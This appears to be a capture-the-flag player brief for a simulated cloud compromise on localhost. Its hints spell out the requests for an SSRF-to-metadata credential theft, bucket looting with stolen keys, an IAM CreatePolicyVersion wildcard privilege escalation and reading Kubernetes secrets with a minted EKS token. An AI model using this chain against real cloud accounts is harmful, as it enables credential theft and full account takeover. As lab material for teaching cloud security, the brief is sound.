# Cumulus — player brief

You've found an SSRF in a customer's cloud app. Turn it into a full cloud
compromise. Four flags `CLD{...}`, each stage's loot unlocking the next.

- **Public app (CloudSnap):** http://localhost:8097 — only this is internet-facing.
- **Cloud APIs:** control plane `http://localhost:8098`, kube api `http://localhost:8099`
  (reachable, but they want valid credentials).
- Submit flags on the scoreboard (http://localhost:8507).

## The chain

1. **Metadata theft** — `GET /fetch?url=...` fetches arbitrary URLs *from inside
   the cloud network*. What lives at `169.254.169.254`?
2. **Bucket loot** — the credentials you stole belong to the instance role. What
   can it read on the control plane?
3. **Privilege escalation** — the key in that bucket is a devops user. Look at
   what IAM actions it's allowed on its own policy.
4. **Cluster takeover** — admin on the cloud is admin on the cluster. Mint an EKS
   token and read the cluster's secrets.

## Hints

<details><summary>1 — SSRF → IMDS</summary>
<code>/fetch?url=http://imds/latest/user-data</code> leaks the bootstrap flag;
<code>/fetch?url=http://imds/latest/meta-data/iam/security-credentials/cumulus-web-instance</code>
returns the instance role credentials (an <code>ASIA…</code> access key).</details>

<details><summary>2 — S3</summary>
Send the stolen key as header <code>X-Cloud-Access-Key</code>:
<code>GET controlplane:8098/s3/cumulus-backups</code> lists it; grab
<code>flag.txt</code> and <code>iam/devops-ci-access-key.json</code>.</details>

<details><summary>3 — IAM privesc</summary>
The devops user has <code>iam:CreatePolicyVersion</code> on <code>devops-policy</code>.
<code>POST /iam/CreatePolicyVersion {"PolicyName":"devops-policy",
"PolicyDocument":{"Statement":[{"Action":"*","Resource":"*"}]}}</code>, then
<code>GET /iam/whoami</code> — you're admin, flag included.</details>

<details><summary>4 — EKS → k8s</summary>
As admin: <code>GET controlplane/sts/eks-get-token</code> → a bearer token.
<code>GET kubeapi:8099/api/v1/namespaces/kube-system/secrets/cluster-master</code>
with <code>Authorization: Bearer &lt;token&gt;</code>; the flag is base64 in
<code>data.flag</code> (k8s secrets are base64, not encrypted).</details>
